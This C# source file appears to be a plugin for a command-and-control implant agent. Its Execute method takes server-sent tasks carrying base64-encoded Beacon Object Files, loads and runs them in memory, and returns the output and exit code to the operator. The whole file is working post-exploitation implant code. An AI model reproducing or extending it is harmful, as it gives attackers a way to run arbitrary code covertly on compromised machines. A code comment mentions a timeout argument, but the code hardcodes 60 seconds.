using System;
using System.Collections.Generic;
using System.IO;
using coff.coff;
using Agent.Interfaces;
using Agent.Models;
using System.Collections.Concurrent;
using Agent.Utilities;

namespace coff
{
    public class Coff : IPlugin
    {
        public string Name => "coff";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }
        public Coff(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                //Need Args
                // asm - base64 encoded buffer of bof
                // functionName - name of function to be called
                // arguments - base64 encoded byteArray of bof arguments from beacon generate
                // timeout - timeout for thread to wait before killing bof execution (in seconds)
                BofRunner br = new BofRunner(args);
                br.LoadBof();
                BofRunnerOutput bro = br.RunBof(60);
                messageManager.Write(bro.Output + Environment.NewLine + $"Exit Code: {bro.ExitCode}", job.task.id, true);
            }
            catch (Exception e)
            {
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
